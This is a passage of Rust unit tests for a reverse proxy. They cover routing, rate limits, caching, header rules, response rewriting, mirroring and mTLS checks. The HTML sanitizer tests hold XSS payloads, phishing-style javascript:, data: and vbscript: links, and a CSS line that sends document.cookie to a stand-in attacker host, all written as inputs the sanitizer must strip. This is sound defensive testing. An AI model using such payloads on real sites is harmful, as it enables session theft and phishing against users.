    // When flood_threshold_rps is 0, adaptive defense is disabled
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert_eq!(config.flood_threshold_rps, 0);

    let base_limit: f64 = 100.0;
    let threshold = config.flood_threshold_rps;
    let global_rps = 999999.0;
    let mut effective = base_limit;
    if threshold > 0 && global_rps > threshold as f64 {
        effective *= 0.5;
    }
    assert_eq!(
        effective, 100.0,
        "No halving when threshold is 0 (disabled)"
    );
}

#[test]
fn test_global_rate_decays_to_zero() {
    let global_rate = Arc::new(lorica_limits::rate::Rate::new(Duration::from_secs(1)));

    for _ in 0..10 {
        global_rate.observe(&"global", 1);
    }

    // Wait for two full intervals so data expires
    std::thread::sleep(Duration::from_millis(2100));
    let rate = global_rate.rate(&"global");
    assert_eq!(
        rate, 0.0,
        "Rate should decay to 0 after 2 intervals of silence"
    );
}

// ---- Catch-all Hostname ----

#[test]
fn test_catch_all_hostname() {
    let route = make_route("r_catch", "_", "/", true);
    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );

    // Catch-all "_" should match any hostname
    assert!(config.find_route("anything.example.com", "/").is_some());
    assert!(config.find_route("other.org", "/api").is_some());

    let entry = config.find_route("random-host.net", "/").unwrap();
    assert_eq!(entry.route.id, "r_catch");
}

#[test]
fn test_catch_all_after_exact() {
    let exact = make_route("r_exact", "app.example.com", "/", true);
    let catch_all = make_route("r_catch", "_", "/", true);
    let config = ProxyConfig::from_store(
        vec![exact, catch_all],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );

    // Exact hostname takes precedence
    let entry = config.find_route("app.example.com", "/").unwrap();
    assert_eq!(entry.route.id, "r_exact");

    // Unknown hostname falls through to catch-all
    let entry = config.find_route("unknown.org", "/").unwrap();
    assert_eq!(entry.route.id, "r_catch");
}

// ---- Path Rule Matching ----

#[test]
fn test_path_rule_matching() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.path_rules = vec![
        PathRule {
            path: "/api/v2".into(),
            match_type: PathMatchType::Prefix,
            backend_ids: None,
            cache_enabled: Some(false),
            cache_ttl_s: None,
            response_headers: None,
            response_headers_remove: None,
            rate_limit_rps: None,
            rate_limit_burst: None,
            redirect_to: None,
            return_status: None,
        },
        PathRule {
            path: "/health".into(),
            match_type: PathMatchType::Exact,
            backend_ids: None,
            cache_enabled: None,
            cache_ttl_s: None,
            response_headers: None,
            response_headers_remove: None,
            rate_limit_rps: None,
            rate_limit_burst: None,
            redirect_to: None,
            return_status: Some(200),
        },
    ];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );

    let entry = config.find_route("example.com", "/api/v2/users").unwrap();
    assert_eq!(entry.route.id, "r1");

    // Verify first path rule matches prefix
    let matched = entry
        .route
        .path_rules
        .iter()
        .find(|r| r.matches("/api/v2/users"));
    assert!(matched.is_some());
    assert_eq!(matched.unwrap().path, "/api/v2");

    // Verify exact match rule
    let matched = entry.route.path_rules.iter().find(|r| r.matches("/health"));
    assert!(matched.is_some());
    assert_eq!(matched.unwrap().return_status, Some(200));

    // Verify exact match does not match prefix
    let matched = entry
        .route
        .path_rules
        .iter()
        .find(|r| r.matches("/health/check"));
    assert!(matched.is_none());
}

// ---- Trusted Proxies ----

#[test]
fn test_trusted_proxies_empty_by_default() {
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals::default(),
    );
    assert!(config.trusted_proxies.is_empty());
}

#[test]
fn test_trusted_proxies_cidr_parsed() {
    let cidrs = vec!["192.168.0.0/16".to_string(), "10.0.0.0/8".to_string()];
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            trusted_proxy_cidrs: cidrs,
            ..Default::default()
        },
    );
    assert_eq!(config.trusted_proxies.len(), 2);
    // 192.168.1.1 is in 192.168.0.0/16
    let addr: std::net::IpAddr = "192.168.1.1".parse().unwrap();
    assert!(config.trusted_proxies.iter().any(|net| net.contains(&addr)));
    // 172.16.0.1 is NOT in the configured ranges
    let addr2: std::net::IpAddr = "172.16.0.1".parse().unwrap();
    assert!(!config
        .trusted_proxies
        .iter()
        .any(|net| net.contains(&addr2)));
}

#[test]
fn test_trusted_proxies_bare_ip_converted() {
    let cidrs = vec!["10.0.0.1".to_string()];
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            trusted_proxy_cidrs: cidrs,
            ..Default::default()
        },
    );
    assert_eq!(config.trusted_proxies.len(), 1);
    let addr: std::net::IpAddr = "10.0.0.1".parse().unwrap();
    assert!(config.trusted_proxies.iter().any(|net| net.contains(&addr)));
    // Different IP should not match
    let addr2: std::net::IpAddr = "10.0.0.2".parse().unwrap();
    assert!(!config
        .trusted_proxies
        .iter()
        .any(|net| net.contains(&addr2)));
}

#[test]
fn test_trusted_proxies_invalid_entries_skipped() {
    let cidrs = vec![
        "192.168.0.0/16".to_string(),
        "not-a-cidr".to_string(),
        "".to_string(),
        "10.0.0.1".to_string(),
    ];
    let config = ProxyConfig::from_store(
        vec![],
        vec![],
        vec![],
        vec![],
        ProxyConfigGlobals {
            trusted_proxy_cidrs: cidrs,
            ..Default::default()
        },
    );
    // Only the valid CIDR and the valid bare IP should be parsed
    assert_eq!(config.trusted_proxies.len(), 2);
}

// ---- Sticky sessions ----

#[test]
fn test_extract_sticky_backend_single_cookie() {
    assert_eq!(
        extract_sticky_backend("LORICA_SRV=abc-123"),
        Some("abc-123")
    );
}

#[test]
fn test_extract_sticky_backend_multiple_cookies() {
    assert_eq!(
        extract_sticky_backend("session=xyz; LORICA_SRV=backend-42; lang=en"),
        Some("backend-42")
    );
}

#[test]
fn test_extract_sticky_backend_absent() {
    assert_eq!(extract_sticky_backend("session=xyz; lang=en"), None);
}

#[test]
fn test_extract_sticky_backend_empty() {
    assert_eq!(extract_sticky_backend(""), None);
}

// ---- Cache Lock ----

#[test]
fn test_cache_lock_static_initializes() {
    let lock: &'static CacheLock = *CACHE_LOCK;
    let _: &'static lorica_cache::lock::CacheKeyLockImpl = lock;
}

// ---- Stale-while-error defaults ----

#[test]
fn test_cache_defaults_accessible() {
    // Verify the CACHE_DEFAULTS_5MIN static compiles and is usable.
    // The stale-while-revalidate (10s) and stale-if-error (60s) values
    // are set inline in the constant definition.
    let _defaults = &CACHE_DEFAULTS_5MIN;
}

// ---- HTML escape ----

#[test]
fn test_escape_html_basic() {
    assert_eq!(escape_html("hello"), "hello");
    assert_eq!(escape_html("<script>"), "&lt;script&gt;");
    assert_eq!(escape_html("a&b"), "a&amp;b");
    assert_eq!(escape_html("\"quoted\""), "&quot;quoted&quot;");
    assert_eq!(escape_html("it's"), "it&#x27;s");
}

#[test]
fn test_escape_html_combined() {
    let input = "<img src=x onerror=\"alert('xss')\">";
    let escaped = escape_html(input);
    assert!(!escaped.contains('<'));
    assert!(!escaped.contains('>'));
    assert!(!escaped.contains('"'));
}

// ---- HTML sanitize ----

#[test]
fn test_sanitize_html_strips_script() {
    let input = "<h1>Error</h1><script>alert('xss')</script><p>Details</p>";
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<script"));
    assert!(!sanitized.contains("alert"));
    assert!(sanitized.contains("<h1>Error</h1>"));
    assert!(sanitized.contains("<p>Details</p>"));
}

#[test]
fn test_sanitize_html_strips_event_handlers() {
    let input = r#"<img src="/x.png" onerror="alert(1)"><div onclick="steal()">"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("onerror"));
    assert!(!sanitized.contains("onclick"));
    // ammonia drops the img src when it cannot be resolved to an
    // absolute URL under url_relative=Deny, but the <img> tag itself
    // and <div> structure remain.
    assert!(sanitized.contains("<div"));
}

#[test]
fn test_sanitize_html_strips_javascript_uri() {
    let input = r#"<a href="javascript:alert(1)">click</a>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("javascript:"));
}

#[test]
fn test_sanitize_html_preserves_structural_tags() {
    // Operators may ship a full document; the structural tags must
    // survive so the browser renders a proper page. `{{status}}` and
    // `{{message}}` are literal strings the caller substitutes AFTER
    // sanitization, so they round-trip as-is (treated as text).
    let input = "<html><body><h1>{{status}}</h1><p>{{message}}</p></body></html>";
    let sanitized = sanitize_html(input);
    assert!(sanitized.contains("{{status}}"));
    assert!(sanitized.contains("{{message}}"));
    assert!(sanitized.contains("<h1>"));
    assert!(sanitized.contains("<p>"));
}

#[test]
fn test_sanitize_html_strips_svg_onload_bypass() {
    // Classic regex-bypass pattern: SVG tag with inline event handler.
    // The old 3-pass regex missed this (only matched `on*=` when
    // whitespace-preceded in a specific way). ammonia's DOM walk
    // drops it cleanly.
    let input = r#"<svg onload="alert(1)"><circle r="10"/></svg>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("onload"));
    assert!(!sanitized.contains("alert"));
}

#[test]
fn test_sanitize_html_strips_iframe() {
    let input = r#"<iframe src="https://attacker.example/phish"></iframe><p>ok</p>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<iframe"));
    assert!(!sanitized.contains("attacker.example"));
    assert!(sanitized.contains("<p>ok</p>"));
}

#[test]
fn test_sanitize_html_strips_object_and_embed() {
    let input = r#"<object data="evil.swf"></object><embed src="evil.swf"/>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<object"));
    assert!(!sanitized.contains("<embed"));
}

#[test]
fn test_sanitize_html_strips_style_tag() {
    // <style> allows CSS-based exfiltration (background-image:url(...))
    // and on old browsers `expression()`. Not in allow-list.
    let input =
        r#"<style>body { background: url('//attacker/?' + document.cookie) }</style><p>ok</p>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<style"));
    assert!(!sanitized.contains("attacker"));
    assert!(sanitized.contains("<p>ok</p>"));
}

#[test]
fn test_sanitize_html_strips_link_tag() {
    // <link rel="stylesheet" href="..."> can pull remote CSS that
    // runs `@import` side-effects.
    let input = r#"<link rel="stylesheet" href="https://attacker.example/evil.css"><p>ok</p>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<link"));
    assert!(!sanitized.contains("attacker"));
    assert!(sanitized.contains("<p>ok</p>"));
}

#[test]
fn test_sanitize_html_strips_meta_refresh() {
    // <meta http-equiv="refresh" content="0;url=..."> is a redirect
    // primitive. Operator should use 3xx + Location instead.
    let input =
        r#"<meta http-equiv="refresh" content="0;url=https://attacker.example/"/><p>ok</p>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<meta"));
    assert!(!sanitized.contains("refresh"));
    assert!(sanitized.contains("<p>ok</p>"));
}

#[test]
fn test_sanitize_html_rejects_data_uri() {
    // `data:text/html;base64,...` is a classic phishing primitive.
    // url_schemes allow-list rejects it.
    let input = r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("data:"));
    assert!(!sanitized.contains("base64"));
}

#[test]
fn test_sanitize_html_rejects_vbscript_uri() {
    let input = r#"<a href="vbscript:msgbox(1)">click</a>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("vbscript:"));
}

#[test]
fn test_sanitize_html_malformed_nested_script_bypass() {
    // Classic regex bypass: nested `<scr<script>ipt>` confuses a
    // non-parsing regex (the inner pair gets stripped, leaving the
    // outer `<script>` reconstructed). ammonia parses through
    // html5ever so no `<script>` tag appears in the output. Residual
    // text fragments ("alert(1)") may survive as plain text, but
    // they are not executable without a surrounding tag.
    let input = r#"<scr<script>ipt>alert(1)</script>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("<script"));
    assert!(!sanitized.contains("</script"));
}

#[test]
fn test_sanitize_html_preserves_mailto() {
    // mailto: is on the scheme allow-list (useful for operator
    // support links).
    let input = r#"<a href="mailto:ops@example.com">contact</a>"#;
    let sanitized = sanitize_html(input);
    assert!(sanitized.contains("mailto:ops@example.com"));
    assert!(sanitized.contains("contact"));
}

#[test]
fn test_sanitize_html_preserves_https_link() {
    let input = r#"<a href="https://example.com/help">docs</a>"#;
    let sanitized = sanitize_html(input);
    assert!(sanitized.contains(r#"href="https://example.com/help""#));
    assert!(sanitized.contains("docs"));
}

#[test]
fn test_sanitize_html_encoded_javascript_bypass() {
    // HTML-encoded `javascript:` (with `&#58;` for colon). A naive
    // string-match regex would not catch this; ammonia decodes the
    // entity during parse before checking schemes.
    let input = r#"<a href="javascript&#58;alert(1)">click</a>"#;
    let sanitized = sanitize_html(input);
    assert!(!sanitized.contains("javascript"));
}

// ---- Basic auth credential cache ----

#[test]
fn test_basic_auth_cache_stores_and_retrieves() {
    let cache: DashMap<String, Instant> = DashMap::new();
    let key = "admin:password\0$argon2id$hash".to_string();
    cache.insert(key.clone(), Instant::now());
    assert!(cache.get(&key).is_some());
    assert!(cache.get(&key).unwrap().elapsed() < Duration::from_secs(1));
}

#[test]
fn test_basic_auth_cache_ttl_expiry() {
    let cache: DashMap<String, Instant> = DashMap::new();
    let key = "admin:password\0$argon2id$hash".to_string();
    // Insert with a timestamp in the past (simulate expired entry)
    cache.insert(key.clone(), Instant::now() - Duration::from_secs(120));
    let ttl = Duration::from_secs(60);
    let is_valid = cache.get(&key).map(|t| t.elapsed() < ttl).unwrap_or(false);
    assert!(
        !is_valid,
        "Entry older than TTL should be considered expired"
    );
}

#[test]
fn test_basic_auth_cache_key_changes_on_password() {
    // Literal-string cache keys: two distinct (credential, hash)
    // pairs must never compare equal, so one credential cannot
    // pass through on a cache slot primed by the other. Prior
    // code used a 64-bit DefaultHasher digest which is vulnerable
    // to birthday collisions at scale.
    let mut key1 = String::new();
    key1.push_str("admin:password1");
    key1.push('\0');
    key1.push_str("$argon2id$hash1");

    let mut key2 = String::new();
    key2.push_str("admin:password2");
    key2.push('\0');
    key2.push_str("$argon2id$hash1");

    assert_ne!(
        key1, key2,
        "Different passwords must produce different cache keys"
    );
}

// ---- Retry on methods filtering ----

#[test]
fn test_retry_on_methods_empty_allows_all() {
    let route = make_route("r1", "example.com", "/", true);
    // retry_on_methods is empty by default - all methods eligible
    assert!(route.retry_on_methods.is_empty());
    // With retry_attempts set, max_request_retries should return Some
    let mut r = route;
    r.retry_attempts = Some(3);
    assert_eq!(r.retry_attempts, Some(3));
}

#[test]
fn test_retry_on_methods_filters_post() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.retry_attempts = Some(2);
    route.retry_on_methods = vec!["GET".to_string(), "HEAD".to_string()];

    // POST is not in the list - should be filtered out
    let method = "POST";
    let eligible = route.retry_on_methods.is_empty()
        || route
            .retry_on_methods
            .iter()
            .any(|m| m.eq_ignore_ascii_case(method));
    assert!(!eligible, "POST should not be eligible for retry");

    // GET is in the list - should be eligible
    let method = "GET";
    let eligible = route.retry_on_methods.is_empty()
        || route
            .retry_on_methods
            .iter()
            .any(|m| m.eq_ignore_ascii_case(method));
    assert!(eligible, "GET should be eligible for retry");
}

// ---- Stale cache config per route ----

#[test]
fn test_stale_config_defaults() {
    let route = make_route("r1", "example.com", "/", true);
    assert_eq!(route.stale_while_revalidate_s, 10);
    assert_eq!(route.stale_if_error_s, 60);
}

#[test]
fn test_stale_config_custom_values() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.stale_while_revalidate_s = 30;
    route.stale_if_error_s = 300;
    assert_eq!(route.stale_while_revalidate_s, 30);
    assert_eq!(route.stale_if_error_s, 300);
}

#[test]
fn test_stale_config_zero_disables() {
    let mut route = make_route("r1", "example.com", "/", true);
    route.stale_while_revalidate_s = 0;
    route.stale_if_error_s = 0;
    assert_eq!(route.stale_while_revalidate_s as u32, 0);
    assert_eq!(route.stale_if_error_s as u32, 0);
}

// ---- Header-based routing ----

fn mk_backend_with_id(id: &str) -> Backend {
    let mut b = make_backend(id, &format!("10.0.0.{}:80", id.as_bytes()[0]));
    b.id = id.to_string();
    b
}

#[test]
fn test_header_rule_exact_match() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    let rule = HeaderRule {
        header_name: "X-Tenant".into(),
        match_type: HeaderMatchType::Exact,
        value: "acme".into(),
        backend_ids: vec![],
    };
    assert!(rule.matches("acme", |_| false));
    assert!(!rule.matches("Acme", |_| false)); // case-sensitive on value
    assert!(!rule.matches("acmeco", |_| false));
    assert!(!rule.matches("", |_| false));
}

#[test]
fn test_header_rule_prefix_match() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    let rule = HeaderRule {
        header_name: "X-Version".into(),
        match_type: HeaderMatchType::Prefix,
        value: "v2".into(),
        backend_ids: vec![],
    };
    assert!(rule.matches("v2", |_| false));
    assert!(rule.matches("v2.1.3", |_| false));
    assert!(!rule.matches("v1.9", |_| false));
}

#[test]
fn test_header_rule_regex_closure() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    let rule = HeaderRule {
        header_name: "User-Agent".into(),
        match_type: HeaderMatchType::Regex,
        value: r"^Mozilla/.*Chrome".into(),
        backend_ids: vec![],
    };
    let re = regex::Regex::new(&rule.value).unwrap();
    assert!(rule.matches("Mozilla/5.0 ... Chrome/120", |v| re.is_match(v)));
    assert!(!rule.matches("curl/8.0", |v| re.is_match(v)));
    // Closure never called for Exact/Prefix types: `|_| panic!()`
    // would be tempting but verify by constructing a non-panic closure
    // and swapping the match_type.
    let mut exact = rule.clone();
    exact.match_type = HeaderMatchType::Exact;
    exact.value = "curl/8.0".into();
    assert!(exact.matches("curl/8.0", |_| panic!("closure must not run for Exact")));
}

#[test]
fn test_match_header_rule_backends_case_insensitive_header_lookup() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    // Header names are compared case-insensitively per RFC 7230; we
    // rely on http::HeaderMap's canonical lookup, but the lookup key
    // we pass in is the operator's raw string. Verify the contract.
    let rules = vec![HeaderRule {
        header_name: "X-Tenant".into(),
        match_type: HeaderMatchType::Exact,
        value: "acme".into(),
        backend_ids: vec!["b1".into()],
    }];
    let regexes: Vec<Option<Arc<regex::Regex>>> = vec![None];
    let backends: Vec<Option<Vec<Backend>>> = vec![Some(vec![mk_backend_with_id("b1")])];

    // Request uses lowercase header name; must still match.
    let headers = hmap(&[("x-tenant", "acme")]);
    assert!(match_header_rule_backends(&rules, &regexes, &backends, &headers).is_some());

    // Request uses different case; still matches.
    let headers2 = hmap(&[("X-TENANT", "acme")]);
    assert!(match_header_rule_backends(&rules, &regexes, &backends, &headers2).is_some());
}

#[test]
fn test_match_header_rule_backends_first_match_wins() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    let rules = vec![
        HeaderRule {
            header_name: "X-Version".into(),
            match_type: HeaderMatchType::Prefix,
            value: "v2".into(),
            backend_ids: vec!["v2".into()],
        },
        HeaderRule {
            header_name: "X-Version".into(),
            match_type: HeaderMatchType::Prefix,
            value: "v".into(), // would also match "v2..." but comes second
            backend_ids: vec!["fallback".into()],
        },
    ];
    let regexes = vec![None, None];
    let backends = vec![
        Some(vec![mk_backend_with_id("v2")]),
        Some(vec![mk_backend_with_id("fallback")]),
    ];
    let headers = hmap(&[("x-version", "v2.3")]);
    let result = match_header_rule_backends(&rules, &regexes, &backends, &headers)
        .expect("should match first rule");
    assert_eq!(result.len(), 1);
    assert_eq!(result[0].id, "v2");
}

#[test]
fn test_match_header_rule_backends_missing_header_skips_rule() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    // Exact match on a header that isn't present must not match
    // (otherwise a rule `value=""` would match absence).
    let rules = vec![HeaderRule {
        header_name: "X-Tenant".into(),
        match_type: HeaderMatchType::Exact,
        value: "acme".into(),
        backend_ids: vec!["b1".into()],
    }];
    let regexes = vec![None];
    let backends = vec![Some(vec![mk_backend_with_id("b1")])];
    let headers = hmap(&[]);
    assert!(match_header_rule_backends(&rules, &regexes, &backends, &headers).is_none());
}

#[test]
fn test_match_header_rule_backends_match_without_override_returns_none() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    // A rule that matches but has no backend_ids means "match but use
    // route defaults" - caller must not set matched_backends.
    let rules = vec![HeaderRule {
        header_name: "X-Flag".into(),
        match_type: HeaderMatchType::Exact,
        value: "on".into(),
        backend_ids: vec![],
    }];
    let regexes = vec![None];
    let backends: Vec<Option<Vec<Backend>>> = vec![None];
    let headers = hmap(&[("x-flag", "on")]);
    assert!(match_header_rule_backends(&rules, &regexes, &backends, &headers).is_none());
}

#[test]
fn test_match_header_rule_backends_regex_rule_without_compiled_is_fail_closed() {
    use lorica_config::models::{HeaderMatchType, HeaderRule};
    // Regex failed to compile at load time -> regexes[i] = None. The
    // rule must NOT match (fail closed) so a broken regex doesn't
    // send traffic to the wrong backend.
    let rules = vec![HeaderRule {
        header_name: "X-Tenant".into(),
        match_type: HeaderMatchType::Regex,
        value: "(unclosed".into(),
        backend_ids: vec!["b1".into()],
    }];
    let regexes: Vec<Option<Arc<regex::Regex>>> = vec![None];
    let backends = vec![Some(vec![mk_backend_with_id("b1")])];
    let headers = hmap(&[("x-tenant", "anything")]);
    assert!(match_header_rule_backends(&rules, &regexes, &backends, &headers).is_none());
}

// ---- Response body rewriting ----

fn rewrite_rule(
    pattern: &str,
    replacement: &str,
    is_regex: bool,
    max: Option<u32>,
) -> lorica_config::models::ResponseRewriteRule {
    lorica_config::models::ResponseRewriteRule {
        pattern: pattern.into(),
        replacement: replacement.into(),
        is_regex,
        max_replacements: max,
    }
}

fn compile(
    rules: Vec<lorica_config::models::ResponseRewriteRule>,
) -> Vec<Option<CompiledRewriteRule>> {
    rules
        .iter()
        .enumerate()
        .map(|(i, r)| compile_rewrite_rule(r, "test-route", i))
        .collect()
}

#[test]
fn test_apply_response_rewrites_literal_single_match() {
    let rules = compile(vec![rewrite_rule(
        "internal.svc",
        "api.example.com",
        false,
        None,
    )]);
    let body = b"GET http://internal.svc/path HTTP/1.1";
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, b"GET http://api.example.com/path HTTP/1.1");
}

#[test]
fn test_apply_response_rewrites_literal_multiple_matches() {
    let rules = compile(vec![rewrite_rule("cat", "dog", false, None)]);
    let body = b"cat sat on a cat mat";
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, b"dog sat on a dog mat");
}

#[test]
fn test_apply_response_rewrites_literal_no_match_leaves_body_intact() {
    let rules = compile(vec![rewrite_rule("needle", "yarn", false, None)]);
    let body = b"haystack without any n33dle";
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, body);
}

#[test]
fn test_apply_response_rewrites_regex_substitution() {
    // Redact numbers.
    let rules = compile(vec![rewrite_rule(r"\d+", "***", true, None)]);
    let body = b"account 12345 balance 67";
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, b"account *** balance ***");
}

#[test]
fn test_apply_response_rewrites_regex_with_capture_groups() {
    // regex::bytes::Regex supports $N substitution.
    let rules = compile(vec![rewrite_rule(r"v(\d+)", r"version-$1", true, None)]);
    let body = b"upgrade from v1 to v22";
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, b"upgrade from version-1 to version-22");
}

#[test]
fn test_apply_response_rewrites_max_replacements_caps_substitutions() {
    let rules = compile(vec![rewrite_rule("a", "X", false, Some(3))]);
    let body = b"aaaaaaaaaa"; // 10 a's
    let out = apply_response_rewrites(body, &rules);
    assert_eq!(out, b"XXXaaaaaaa", "only first 3 should be rewritten");
}

#[test]
fn test_apply_response_rewrites_rules_compose_in_order() {
    // Rule 1 produces text rule 2 then consumes.
    let rules = compile(vec![
        rewrite_rule("alpha", "beta", false, None),
        rewrite_rule("beta", "gamma", false, None),
    ]);
    let body = b"alpha and beta walk in";
    let out = apply_response_rewrites(body, &rules);
    // alpha -> beta first, then both "beta"s -> gamma
    assert_eq!(out, b"gamma and gamma walk in");
}

#[test]
fn test_apply_response_rewrites_invalid_regex_is_skipped() {
    // Compile fails; rule yields None; apply treats as no-op.
    let cfg_rules = vec![
        rewrite_rule("(unclosed", "x", true, None),
        rewrite_rule("good", "ok", false, None),
    ];
    let compiled = compile(cfg_rules);
    assert!(compiled[0].is_none(), "bad regex must yield None");
    assert!(compiled[1].is_some());

    let body = b"good and (unclosed";
    let out = apply_response_rewrites(body, &compiled);
    // Only the "good" rule applied; "(unclosed" is literal in the
    // body and the broken rule is skipped.
    assert_eq!(out, b"ok and (unclosed");
}

#[test]
fn test_apply_response_rewrites_binary_safe_on_non_utf8() {
    // Invalid UTF-8 bytes with a literal ASCII marker in the middle.
    // The rewrite must operate on bytes, not strings, so the non-
    // UTF-8 bytes pass through untouched.
    let rules = compile(vec![rewrite_rule("mark", "MARK", false, None)]);
    let mut body: Vec<u8> = vec![0xFF, 0xFE, 0x00];
    body.extend_from_slice(b"mark");
    body.extend_from_slice(&[0xFF, 0xFE]);
    let out = apply_response_rewrites(&body, &rules);
    let expected: Vec<u8> = {
        let mut v = vec![0xFF, 0xFE, 0x00];
        v.extend_from_slice(b"MARK");
        v.extend_from_slice(&[0xFF, 0xFE]);
        v
    };
    assert_eq!(out, expected);
}

fn rewrite_cfg(prefixes: Vec<&str>) -> lorica_config::models::ResponseRewriteConfig {
    lorica_config::models::ResponseRewriteConfig {
        rules: vec![],
        max_body_bytes: 1024,
        content_type_prefixes: prefixes.into_iter().map(String::from).collect(),
    }
}

#[test]
fn test_should_rewrite_response_default_text_prefix() {
    let cfg = rewrite_cfg(vec![]); // empty -> default to "text/"
    assert!(should_rewrite_response(&cfg, "text/html", ""));
    assert!(should_rewrite_response(
        &cfg,
        "text/plain; charset=utf-8",
        ""
    ));
    assert!(!should_rewrite_response(&cfg, "application/json", ""));
}

#[test]
fn test_should_rewrite_response_explicit_prefixes() {
    let cfg = rewrite_cfg(vec!["application/json", "application/xml"]);
    assert!(should_rewrite_response(&cfg, "application/json", ""));
    assert!(should_rewrite_response(&cfg, "application/xml", ""));
    assert!(!should_rewrite_response(&cfg, "text/html", ""));
}

#[test]
fn test_should_rewrite_response_skips_compressed_content() {
    let cfg = rewrite_cfg(vec!["text/"]);
    assert!(!should_rewrite_response(&cfg, "text/html", "gzip"));
    assert!(!should_rewrite_response(&cfg, "text/html", "br"));
    // `identity` is explicitly NOT compressed.
    assert!(should_rewrite_response(&cfg, "text/html", "identity"));
    // Empty / missing encoding ok too.
    assert!(should_rewrite_response(&cfg, "text/html", ""));
    assert!(should_rewrite_response(&cfg, "text/html", "   "));
}

#[test]
fn test_should_rewrite_response_case_insensitive_content_type() {
    let cfg = rewrite_cfg(vec!["text/"]);
    assert!(should_rewrite_response(&cfg, "TEXT/HTML", ""));
    assert!(should_rewrite_response(&cfg, "Text/Plain", ""));
}

// ---- Request mirroring ----

#[test]
fn test_mirror_sample_hit_zero_always_false() {
    for i in 0..1000 {
        let id = format!("r-{i}");
        assert!(!mirror_sample_hit(&id, 0));
    }
}

#[test]
fn test_mirror_sample_hit_hundred_always_true() {
    for i in 0..1000 {
        let id = format!("r-{i}");
        assert!(mirror_sample_hit(&id, 100));
    }
}

#[test]
fn test_mirror_sample_hit_is_deterministic() {
    let id = "req-abc-123";
    let a = mirror_sample_hit(id, 25);
    for _ in 0..100 {
        assert_eq!(a, mirror_sample_hit(id, 25));
    }
}

#[test]
fn test_mirror_sample_hit_distribution_roughly_uniform() {
    // 20% sample over 1000 distinct request IDs should land in a
    // wide ±7% window; a broken hash would fail dramatically.
    let mut hits = 0u32;
    for i in 0..1000u32 {
        let id = format!("req-{i:08}");
        if mirror_sample_hit(&id, 20) {
            hits += 1;
        }
    }
    let pct = hits as f64 / 1000.0 * 100.0;
    assert!(
        (13.0..=27.0).contains(&pct),
        "20% mirror sample landed at {pct:.1}%, hash distribution bug?"
    );
}

#[test]
fn test_build_mirror_url_bare_host() {
    assert_eq!(
        build_mirror_url("10.0.0.1:8080", "/api/v1?x=1"),
        Some("http://10.0.0.1:8080/api/v1?x=1".to_string())
    );
}

#[test]
fn test_build_mirror_url_full_url() {
    assert_eq!(
        build_mirror_url("https://shadow.example.com", "/foo"),
        Some("https://shadow.example.com/foo".to_string())
    );
}

// ---- evaluate_mtls ----

fn enforcer(required: bool, orgs: Vec<&str>) -> MtlsEnforcer {
    MtlsEnforcer {
        required,
        allowed_organizations: orgs.into_iter().map(String::from).collect(),
    }
}

#[test]
fn test_evaluate_mtls_required_no_cert_denies_496() {
    // required = true with an absent client cert is the canonical
    // zero-trust denial. 496 matches Nginx's reserved status.
    assert_eq!(evaluate_mtls(&enforcer(true, vec![]), None), Some(496));
}

#[test]
fn test_evaluate_mtls_required_with_cert_and_empty_allowlist_passes() {
    // Allowlist empty = trust the chain verifier. Any verified
    // cert passes.
    assert_eq!(
        evaluate_mtls(&enforcer(true, vec![]), Some("Acme Corp")),
        None
    );
}

#[test]
fn test_evaluate_mtls_optional_no_cert_passes() {
    // required = false is the opportunistic mode: a missing cert
    // is allowed through to the upstream.
    assert_eq!(evaluate_mtls(&enforcer(false, vec![]), None), None);
}

#[test]
fn test_evaluate_mtls_allowlist_match_passes() {
    assert_eq!(
        evaluate_mtls(&enforcer(true, vec!["Acme", "Beta"]), Some("Acme")),
        None
    );
}

#[test]
fn test_evaluate_mtls_allowlist_miss_denies_495() {
    // Cert chains to the CA but the subject O= isn't on the
    // allowlist - 495 ("SSL certificate error") is the right
    // status code.
    assert_eq!(
        evaluate_mtls(&enforcer(true, vec!["Acme"]), Some("Gamma")),
        Some(495)
    );
}

#[test]
fn test_evaluate_mtls_allowlist_miss_denies_even_when_not_required() {
    // Opportunistic + allowlist is still enforcing: if a cert is
    // presented but doesn't match, deny. Otherwise the allowlist
    // would be silently bypassable by omitting the cert.
    assert_eq!(
